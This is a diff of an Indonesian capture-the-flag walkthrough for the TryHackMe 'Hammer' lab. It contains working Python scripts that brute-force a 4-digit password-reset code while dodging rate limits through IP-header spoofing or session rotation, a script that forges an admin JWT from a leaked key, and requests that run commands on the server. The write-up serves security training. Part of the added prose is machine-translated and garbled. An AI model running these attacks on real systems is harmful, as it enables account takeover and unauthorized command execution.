@@ -33,222 +33,293 @@ http://hammer.thm:1337
 
 ## 1. Recon
 
-Scan port:
+Pemindaian Peta
 
-```bash
-nmap -sC -sV -p- --min-rate 1000 <TARGET_IP>
-```
-
-Hasil penting:
-
-```text
-1337/tcp open  http
-```
-
-Aplikasi web berjalan pada port `1337`.
+Kami mulai dengan pemindaian peta dan menemukan dua port terbuka. Di atas pelabuhan  22kami memiliki SSH dan di pelabuhan  1337Kami memiliki server web Apache.
+![Recon nmap](recon%20nmap.jpg)
 
 ---
 
-## 2. Directory Enumeration
+## 2. Pemindaian Direktori Dan Manuel Enum dari 1337
 
-Dari source page ditemukan pola direktori dengan prefix:
+Karena titik masuk kami mungkin adalah server web, kami memindai kemungkinan direktori dan halaman menggunakan Feroxbuster sambil menyebutkan target secara manual.
+![Recon firefox](recon%20firefox.png)
 
-```text
-hmr_
-```
+Kami menemukan beberapa halaman dan direktori. Di antara mereka PhpMyAdmin. Jadi kita berurusan dengan server web PHP. Terlepas dari ini, bagaimanapun, tidak ada yang lain, kecuali bahwa folder CSS terlihat agak aneh.
 
-Lakukan fuzzing:
+┌──(0xb0b㉿kali)-[~/Documents/tryhackme/hammer]
+└─$ feroxbuster -u 'http://hammer.thm:1337' -w /usr/share/wordlists/dirb/big.txt
+                                                                                                                      
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.2
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://hammer.thm:1337
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.2
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       47l      111w     1664c http://hammer.thm:1337/reset_password.php
+200      GET        6l     2304w   232914c http://hammer.thm:1337/hmr_css/bootstrap.min.css
+200      GET       36l       83w     1326c http://hammer.thm:1337/
+301      GET        9l       28w      320c http://hammer.thm:1337/javascript => http://hammer.thm:1337/javascript/
+301      GET        9l       28w      320c http://hammer.thm:1337/phpmyadmin => http://hammer.thm:1337/phpmyadmin/
+301      GET        9l       28w      316c http://hammer.thm:1337/vendor => http://hammer.thm:1337/vendor/
+200      GET        0l        0w        0c http://hammer.thm:1337/vendor/autoload.php
+200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/ClassLoader.php
+200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_real.php
+200      GET       63l      136w     2071c http://hammer.thm:1337/vendor/composer/installed.json
+200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_namespaces.php
+200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_static.php
+200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_psr4.php
+200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_classmap.php
+200      GET       19l      168w     1068c http://hammer.thm:1337/vendor/composer/LICENSE
+200      GET       30l      224w     1529c http://hammer.thm:1337/vendor/firebase/php-jwt/LICENSE
+200      GET       42l      100w     1173c http://hammer.thm:1337/vendor/firebase/php-jwt/composer.json
+200      GET      170l      650w     8697c http://hammer.thm:1337/vendor/firebase/php-jwt/CHANGELOG.md
+200      GET      424l     1529w    13516c http://hammer.thm:1337/vendor/firebase/php-jwt/README.md
+301      GET        9l       28w      327c http://hammer.thm:1337/javascript/jquery => http://hammer.thm:1337/javascript/jquery/
+301      GET        9l       28w      324c http://hammer.thm:1337/phpmyadmin/doc => http://hammer.thm:1337/phpmyadmin/doc/
+200      GET       98l      278w    35231c http://hammer.thm:1337/phpmyadmin/favicon.ico
 
-```bash
-ffuf -u http://hammer.thm:1337/hmr_FUZZ \
--w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
--mc 200,301
-```
+Mengunjungi halaman indeks dengan pencacahan manual membawa kita langsung ke halaman login. 
+![Halaman web login hammer thm](halamanwebloginhammer%20thm.png)
 
-Ditemukan direktori:
+Dalam sumbernya, kita menemukan konvensi yang disebutkan di antara para direktori. Ini dimulai dengan hmr_.
+![Endpoint hammer thm](endpointnhammer%20thm.png)
 
-```text
-/hmr_logs
-```
+Jadi kita mengedit wordlist bekas dengan melakukan prepending  hmr_dan scan lagi.
 
-Buka:
+cp /usr/share/wordlists/dirb/big.txt .
+sed 's/^/hmr_/' big.txt > hmr_big.txt
 
-```text
-http://hammer.thm:1337/hmr_logs/
-```
+![Feroxbuster2](feroxbuster2%20.png)
 
-Dari file log ditemukan email valid:
+Kami sekarang menemukan direktori hmr_logs, yang memiliki daftar direktori diaktifkan. Direktori ini berisi  error.logsberkas.
 
-```text
-tester@hammer.thm
+┌──(0xb0b㉿kali)-[~/Documents/tryhackme/hammer]
+└─$ feroxbuster -u 'http://hammer.thm:1337' -w hmr_big.txt
+                                                                                                                      
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.2
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://hammer.thm:1337
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ hmr_big.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.2
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       47l      111w     1664c http://hammer.thm:1337/reset_password.php
+200      GET        6l     2304w   232914c http://hammer.thm:1337/hmr_css/bootstrap.min.css
+200      GET       36l       83w     1326c http://hammer.thm:1337/
+301      GET        9l       28w      317c http://hammer.thm:1337/hmr_css => http://hammer.thm:1337/hmr_css/
+301      GET        9l       28w      320c http://hammer.thm:1337/hmr_images => http://hammer.thm:1337/hmr_images/
+200      GET     1676l     9897w   792599c http://hammer.thm:1337/hmr_images/hammer.webp
+301      GET        9l       28w      316c http://hammer.thm:1337/hmr_js => http://hammer.thm:1337/hmr_js/
+200      GET        2l     1294w    89501c http://hammer.thm:1337/hmr_js/jquery-3.6.0.min.js
+301      GET        9l       28w      318c http://hammer.thm:1337/hmr_logs => http://hammer.thm:1337/hmr_logs/
+200      GET        9l      219w     1984c http://hammer.thm:1337/hmr_logs/error.logs
+[####################] - 25s    20480/20480   0s      found:10      errors:0      
+[####################] - 24s    20469/20469   844/s   http://hammer.thm:1337/ 
+[####################] - 0s     20469/20469   193104/s http://hammer.thm:1337/hmr_css/ => Directory listing
+[####################] - 1s     20469/20469   34172/s http://hammer.thm:1337/hmr_images/ => Directory listing
+[####################] - 0s     20469/20469   84583/s http://hammer.thm:1337/hmr_js/ => Directory listing
+[####################] - 0s     20469/20469   208867/s http://hammer.thm:1337/hmr_logs/ => Directory listing
 ```
 
 ---
 
-## 3. Password Reset OTP Brute Force
+## 3. Melewati Login
 
-Akses halaman reset password:
-
-```text
-http://hammer.thm:1337/reset_password.php
-```
-
-Masukkan email:
-
-```text
-tester@hammer.thm
-```
-
-Aplikasi meminta recovery code / OTP 4 digit.
-
-Karena format OTP hanya `0000` sampai `9999`, brute force dapat dilakukan.
-
-Contoh script:
-
-```python
-import requests
-import random
-
-url = "http://hammer.thm:1337/reset_password.php"
-email = "tester@hammer.thm"
-
-for code in range(10000):
-    session = requests.Session()
-
-    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
-
-    headers = {
-        "X-Forwarded-For": fake_ip,
-        "X-Forwarded-Host": fake_ip
-    }
-
-    session.post(
-        url,
-        data={"email": email},
-        headers=headers
-    )
-
-    otp = f"{code:04d}"
-
-    response = session.post(
-        url,
-        data={"recovery_code": otp},
-        headers=headers
-    )
-
-    if "Invalid or expired recovery code" not in response.text:
-        print(f"[+] OTP ditemukan: {otp}")
-        print(response.text)
-        break
-```
-
-Setelah OTP valid ditemukan, reset password akun.
-
-Login menggunakan:
-
-```text
-Email    : tester@hammer.thm
-Password : <PASSWORD_BARU>
-```
+Dengan informasi yang kami kumpulkan sejauh ini, kami sekarang harus berkonsentrasi pada login.
+![Halaman web login hammer thm](halamanwebloginhammer%20thm.png)
 
 ---
 
-## 4. Dashboard dan Endpoint Command
+## 4. Login Analisis Halaman
 
-Setelah login, aplikasi mengirim request ke endpoint:
+Ini hanya menampilkan pesan generik untuk email dan kata sandi yang dimasukkan, dari mana kita tidak dapat menyimpulkan bahwa email atau kata sandi yang salah telah dimasukkan. Kekuatan kasar murni untuk menghitung email karena itu tidak mungkin di sini.
+Tetapi halaman login memiliki tautan ke fitur kata sandi yang terlupakan /reset_password.php. Ini memberikan pesan kesalahan jika surat yang dipilih salah, secara teoritis surat yang valid dapat disebutkan dengan cara ini.
+![End point reset password](endpointreset%20password.png)
 
-```text
-/execute_command.php
-```
+---
 
-Contoh request:
+## 5.Mendapatkan Alamat E-Mail yang Valid
 
-```http
-POST /execute_command.php HTTP/1.1
-Host: hammer.thm:1337
-Authorization: Bearer <JWT>
-X-Requested-With: XMLHttpRequest
-Content-Type: application/json
-Cookie: PHPSESSID=<SESSION>; token=<JWT>; persistentSession=yes
+Mengingatkan pencairan menggunakan daftar kata yang ditempati kami dapat menemukan email di   error.logs.Ada kegagalan otentikasi untuk pengguna tester@hammer.thm.
+![End point log login](endpointlog%20login.png)
 
-{"command":"ls"}
-```
+---
 
-Jika command tidak diizinkan, response:
+## 6. Eksploitasi Fitur Reset Password
 
-```json
+Ketika mencoba untuk mengatur ulang password untuk pengguna ini, ...
+![Halaman reset password udah dapetunsername](halamanrestepassword%20udahdapetunsername.png)
+
+... penyedap halaman dan kita harus memasukkan kode 4 digit untuk mengubah kata sandi. Selain itu, ada batas waktu  180beberapa detik untuk memasukkan kode ini. Untuk prosedur dan analisis lebih lanjut, kami mencegat pengiriman kode 4 digit menggunakan burp suite.
+![Burpsuite1](burpsuite1%20.png)
+
+Dengan setiap permintaan yang sekarang dibuat, nilai Rate-Limit-Pending dalam header respons berkurang. Awalnya ini dimulai pada 8.
+![Burp suite2](burpsuite2%20.png)
+
+Setelah nilai turun ke 0Batas tarif tercapai dan token tidak dapat diatur ulang. Pada titik ini saya kehilangan banyak waktu karena saya berpikir bahwa dengan setiap reset token juga akan diatur ulang. Di bawah asumsi ini, saya pikir saya hanya bisa mendapatkan token dengan sedikit keberuntungan dan kesempatan. 
+
+Oleh karena itu, saya menulis naskah yang membuat  100permintaan pada saat yang sama dengan berbeda PHPSESSIDs dengan harapan mendapatkan reset yang valid dengan token reset tetap. Bahkan, setelah beberapa upaya saya memiliki token permintaan yang valid, tetapi  100respon yang sama, untuk setiap sesi token tetap adalah valid. 
+
+Baru kemudian saya menyadari bahwa token bertahan dalam jangka waktu itu selama setiap sesi yang dibuat, dan tidak mengatur ulang dirinya dengan sesi baru. Asumsi dapat dibuat dengan melihat bahwa token bertahan  180detik.
+![Burp suite3](burpsuite3%20.png)
+
+Untuk memverifikasi bahwa token reset bertahan, kami meminta reset baru tanpa cookie untuk mendapatkan sesi baru.
+![Burp suite4](burpsuite4%20.png)
+
+Kemudian kita menempatkan  PHPSESSIDdari respon ke dalam permintaan kami, dan melihat bahwa kita memiliki 8 upaya lagi, sampai  180Detik sudah berlalu.
+![Burp suite5](burpsuite5%20.png)
+
+Dengan informasi yang kami miliki, kami dapat mengotomatiskan proses pemulihan kata sandi yang melanggar brute. Pertama kali meminta reset kata sandi dan mengambil  PHPSESSIDcookie, kemudian secara berulang kali mengirimkan kode pemulihan dengan cara brute-force, secara berkala menyegarkan  PHPSESSIDsetiap permintaan ketujuh. Skrip mendeteksi pengiriman kode yang sukses dengan memeriksa perubahan dalam jumlah kata teks respons.
+
+	import subprocess
+	
+	def get_phpsessid():
+	    # Request Password Reset and retrieve the PHPSESSID cookie
+	    reset_command = [
+	        "curl", "-X", "POST", "http://hammer.thm:1337/reset_password.php",
+	        "-d", "email=tester%40hammer.thm",
+	        "-H", "Content-Type: application/x-www-form-urlencoded",
+	        "-v"
+	    ]
+	
+	    # Execute the curl command and capture the output
+	    response = subprocess.run(reset_command, capture_output=True, text=True)
+	
+	    # Extract PHPSESSID from the response
+	    phpsessid = None
+	    for line in response.stderr.splitlines():
+	        if "Set-Cookie: PHPSESSID=" in line:
+	            phpsessid = line.split("PHPSESSID=")[1].split(";")[0]
+	            break
+	
+	    return phpsessid
+	
+	def submit_recovery_code(phpsessid, recovery_code):
+	    # Submit Recovery Code using the retrieved PHPSESSID
+	    recovery_command = [
+	        "curl", "-X", "POST", "http://hammer.thm:1337/reset_password.php",
+	        "-d", f"recovery_code={recovery_code}&s=180",
+	        "-H", "Content-Type: application/x-www-form-urlencoded",
+	        "-H", f"Cookie: PHPSESSID={phpsessid}",
+	        "--silent"
+	    ]
+	
+	    # Execute the curl command for recovery code submission
+	    response_recovery = subprocess.run(recovery_command, capture_output=True, text=True)
+	    return response_recovery.stdout
+	
+	def main():
+	    phpsessid = get_phpsessid()
+	    if not phpsessid:
+	        print("Failed to retrieve initial PHPSESSID. Exiting...")
+	        return
+	    
+	    for i in range(10000):
+	        recovery_code = f"{i:04d}"  # Format the recovery code as a 4-digit string
+	
+	        if i % 7 == 0:  # Every 7th request, get a new PHPSESSID
+	            phpsessid = get_phpsessid()
+	            if not phpsessid:
+	                print(f"Failed to retrieve PHPSESSID at attempt {i}. Retrying...")
+	                continue
+	        
+	        response_text = submit_recovery_code(phpsessid, recovery_code)
+	        word_count = len(response_text.split())
+	
+	        if word_count != 148:
+	            print(f"Success! Recovery Code: {recovery_code}")
+	            print(f"PHPSESSID: {phpsessid}")
+	            print(f"Response Text: {response_text}")
+	            break
+	
+	if __name__ == "__main__":
+	    main()
+
+
+Setelah kami menjalankan naskah, kami menerima kode pemulihan yang valid,  PHPSESSIDdan tubuh respon.
+![Script python brup](scriptpython%20brup.png)
+
+---
+
+## 7. Atur Ulang Kata Sandi
+
+Yang harus kita lakukan sekarang adalah mengatur PHPSESSID di browser dan memuat ulang halaman.Setelah kami memuat ulang halaman, kami dapat mengatur ulang kata sandi untuk pengguna tester@hammer.thm.
+![Web bikin pass baru](webbikinpass%20baru.png)
+
+Kami memilih password baru.Kami kemudian login dengan kredensial baru ...
+... dan diteruskan ke dashboard. Kami melihat bahwa kami memiliki peran user, dapat memasuki perintah dan disambut dengan bendera pertama. Setelah waktu yang singkat, kita akan keluar.
+
+
+... dan diteruskan ke dashboard. Kami melihat bahwa kami memiliki peran user, dapat memasuki perintah dan disambut dengan bendera pertama. Setelah waktu yang singkat, kita akan keluar.
+![Halaman login menggunakan username](halamanloginmenggunakan%20username.png)
+
+
+---
+
+## 8. RCE
+
+Pertama kita melihat apa yang memungkinkan kita log out, dalam sumber kita melihat script yang memeriksa cookie setelah interval dan jika kondisi tidak terpenuhi, kita login keluar. Jika jika  persistentSessiontidak diatur ke True, kita akan ditebang. Dengan menggunakan alat OWASP ZAP, kami dapat menetapkan nilai ini secara permanen, tetapi kami juga dapat melanjutkan penyelidikan kami menggunakan Burp Suite tanpa dilunasmi.
+![Ctrl u di halaman web yg sudah login](ctrludihalamanwebygsudah%20login.png)
+
+Selain itu, ada naskah yang mendengarkan acara klik pada  #submitCommandtombol dan mengambil input perintah oleh pengguna. Kemudian mengirimkan permintaan AJAX POST ke execute_command.php, termasuk perintah dan token JWT di header permintaan untuk otorisasi. Setelah menerima tanggapan, ia menampilkan hasil atau pesan kesalahan dalam  #commandOutputelemen. Skrip ini bertanggung jawab atas transmisi perintah.
+![Jwt token](jwt%20token.png)
+
+---
+
+## 9. Analisis Perintah Eksekusi
+
+Kami mencegat permintaan untuk mentransfer perintah menggunakan Burp Suite. Kami melihat token di header dan di cookie. Selain itu, kami tidak diizinkan untuk melaksanakan perintah ID. Kami menggunakan FFuF dengan daftar kata untuk memeriksa perintah mana yang dapat digunakan.
+![Burp suite6](burpsuite6%20.png)
+
+Berkas Kunci
+
+Tampaknya kita hanya bisa mengeksekusi perintah mereka. Selain halaman dan direktori yang sudah kita ketahui ada  .keyfile yang hadir. Kami ingat bahwa peran pengguna kami ditampilkan di dasbor. Ada kemungkinan bahwa peran lain dapat mengeksekusi lebih banyak.
+![Burp suite7](burpsuite7%20.png)
+
+Penciptaan Token JWT
+
+Kami menganalisis token JWT menggunakan  jwt.iodan dapat membuat struktur, di header a  kiddiatur, yang menunjuk ke file kunci yang terletak di  /var/www/mykey.key. Selanjutnya token berisi pengguna peran. Mungkin dengan peran lain seperti admin kita akan dapat melaksanakan perintah sewenang-wenang.
+![Jwtio1](jwtio1%20.png)
+
+Kami ingat daftar kami  lsperintah, di sini kita punya file kunci. File kunci berisi nilai hash. Mungkin rahasia untuk menandatangani token JWT. Jadi kita mungkin bisa membuat token kita sendiri, karena kita memiliki akses ke rahasia dan dapat menebak lokasi token untuk anak itu.
+
+Mari kita buat token admin dengan struktur seperti ini:
+
 {
-  "error": "Command not allowed"
-}
-```
-
-Command `ls` dapat digunakan untuk melihat file di direktori web.
-
----
-
-## 5. Menemukan Key File JWT
-
-Jalankan command:
-
-```json
-{"command":"ls"}
-```
-
-Ditemukan file key:
-
-```text
-188ade1.key
-```
-
-Ambil isi key:
-
-```bash
-curl http://hammer.thm:1337/188ade1.key
-```
-
-Contoh output:
-
-```text
-<ISI_SECRET_KEY>
-```
-
-Catatan penting:
-
-```text
-188ade1.key = nama file key
-<ISI_SECRET_KEY> = isi file key yang dipakai untuk sign JWT
-```
-
-Yang dipakai sebagai `secret_key` adalah **isi file**, bukan nama file.
-
----
-
-## 6. Decode JWT
-
-Ambil JWT dari Burp, lalu decode:
-
-```python
-import jwt
-
-token = "PASTE_JWT_DI_SINI"
-
-print(jwt.get_unverified_header(token))
-print(jwt.decode(token, options={"verify_signature": False}))
-```
-
-Contoh header:
-
-```json
-{
-  "typ": "JWT",
   "alg": "HS256",
-  "kid": "/var/www/html/188ade1.key"
+  "kid": "/var/www/html/188ade1.key",
+  "typ": "JWT"
 }
-```
-
-Contoh payload:
-
-```json
 {
   "iss": "http://hammer.thm",
   "aud": "http://hammer.thm",
@@ -257,147 +328,67 @@ Contoh payload:
   "data": {
     "user_id": 1,
     "email": "tester@hammer.thm",
-    "role": "user"
+    "role": "admin"
   }
 }
-```
-
-Targetnya adalah mengubah role:
-
-```json
-"role": "admin"
-```
-
----
-
-## 7. Forge JWT Admin
-
-Install PyJWT:
-
-```bash
-pip3 install pyjwt
-```
-
-Buat file:
-
-```bash
-nano craft_token.py
-```
-
-Isi:
-
-```python
-import time
-import jwt
-
-# Isi dengan content asli dari 188ade1.key
-secret_key = "<ISI_SECRET_KEY>"
-
-header = {
-    "typ": "JWT",
-    "alg": "HS256",
-    "kid": "/var/www/html/188ade1.key"
-}
-
-now = int(time.time())
-
-payload = {
-    "iss": "http://hammer.thm",
-    "aud": "http://hammer.thm",
-    "iat": now,
-    "exp": now + 3600,
-    "data": {
-        "user_id": 1,
-        "email": "tester@hammer.thm",
-        "role": "admin"
-    }
-}
-
-token = jwt.encode(
-    payload,
-    secret_key,
-    algorithm="HS256",
-    headers=header
+HMACSHA256(
+  base64UrlEncode(header) + "." +
+  base64UrlEncode(payload),
+  
 )
 
-print(token)
-```
+Kami menggunakan skrip python untuk membuat token dengan peran admin, kami memasukkan saluran konten  4dan jalan dari garis rahasia 10. Kami juga menetapkan tanggal kedaluwarsa sedikit lebih tinggi untuk kami.
 
-Jalankan:
+	import jwt
+	
+	
+	secret_key = "REDACTED"
+	
+	
+	header = {
+	    "typ": "JWT",
+	    "alg": "HS256",
+	    "kid": "/var/www/html/REDACTED.key"
+	}
+	
+	
+	payload = {
+	    "iss": "http://hammer.thm",
+	    "aud": "http://hammer.thm",
+	    "iat": 1725193591,
+	    "exp": 1725199591,
+	    "data": {
+	        "user_id": 1,
+	        "email": "tester@hammer.thm",
+	        "role": "admin"
+	    }
+	}
+	
+	# Encode the JWT with the specific header
+	token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)
+	
+	# Print the generated token
+	print(token)
 
-```bash
-python3 craft_token.py | tail -n 1 | tr -d '\n' > token.txt
-cat token.txt
-```
+Menjalankan script, kita mendapatkan token, ditandatangani dengan rahasia, yang terletak di folder root web.
+![Run script jwt](runscript%20jwt.png)
 
-Cek format JWT:
+Menggunakan jwt.ioKami dapat mengkonfirmasi konten barunya.
+![Jwtio2](jwtio2%20.png)
 
-```bash
-cat token.txt | awk -F. '{print NF-1}'
-```
+Eksekusi Kode Jarak Jauh Sewenang-wenang
 
-Output harus:
+Selanjutnya, kami mengganti nilai token dalam header Otorisasi dan nilai cookie token. Setelah itu, kami dapat melaksanakan perintah sewenang-wenang sebagai admin. Dengan menggunakan ID yang kita lihat, kita www-data.
+![Burp suite8](burpsuite8%20.png)
 
-```text
-2
-```
+Sebagai sebagai  www-datakita dapat mengambil bendera kedua di /home/ubuntu.flag.txt
+![Burp suite9](burpsuite9%20.png)
 
----
+Ringkasan
 
-## 8. Pakai Token Admin di Burp
+Dalam tantangan ini kami menghadapi aplikasi web yang rentan di server Apache. Pemindaian Nmap mengidentifikasi SSH di pelabuhan  22dan server web di port 1337. Setelah pemindaian direktori dan pencacahan manual, kami menemukan halaman PhpMyAdmin dan  hmr_logsDirektori yang berisi  error.logsberkas. Log mengungkapkan email yang valid (tester@hammer.thm), yang kami gunakan untuk mengeksploitasi fitur reset kata sandi.
 
-Ganti token pada **dua tempat**:
-
-```http
-Authorization: Bearer <TOKEN_BARU>
-```
-
-dan:
-
-```http
-Cookie: PHPSESSID=<SESSION>; token=<TOKEN_BARU>; persistentSession=yes
-```
-
-Request final:
-
-```http
-POST /execute_command.php HTTP/1.1
-Host: hammer.thm:1337
-Authorization: Bearer <TOKEN_BARU>
-X-Requested-With: XMLHttpRequest
-Accept: */*
-Content-Type: application/json
-Origin: http://hammer.thm:1337
-Referer: http://hammer.thm:1337/dashboard.php
-Cookie: PHPSESSID=<SESSION>; token=<TOKEN_BARU>; persistentSession=yes
-Connection: close
-
-{"command":"ls"}
-```
-
-Jika token benar, error JWT seperti berikut tidak muncul lagi:
-
-```text
-Missing JWT
-Expired token
-Signature verification failed
-```
-
----
-
-## 9. Remote Command Execution
-
-Setelah JWT admin valid, jalankan command untuk membaca flag:
-
-```json
-{"command":"cat /home/ubuntu/flag.txt"}
-```
-
-Response:
-
-```text
-THM{REDACTED}
-```
+Mekanisme reset kata sandi rentan terhadap serangan brute-force, karena memungkinkan beberapa upaya untuk menebak kode reset 4 digit dalam batas waktu, melewati batas tarifnya dengan mengambil sesi baru setiap permintaan ke-7. Dengan mengotomatisasi proses brute-force dan menghindari batas tarif, kami berhasil me-reset kata sandi pengguna. Setelah masuk, kami mendapat bendera pertama dan menganalisis dan memanipulasi token JWT untuk meningkatkan hak istimewa kami admin, memungkinkan eksekusi perintah sewenang-wenang sebagai  www-datadan mengambil bendera kedua di /home/ubuntu.flag.txt.
 
 ---
 
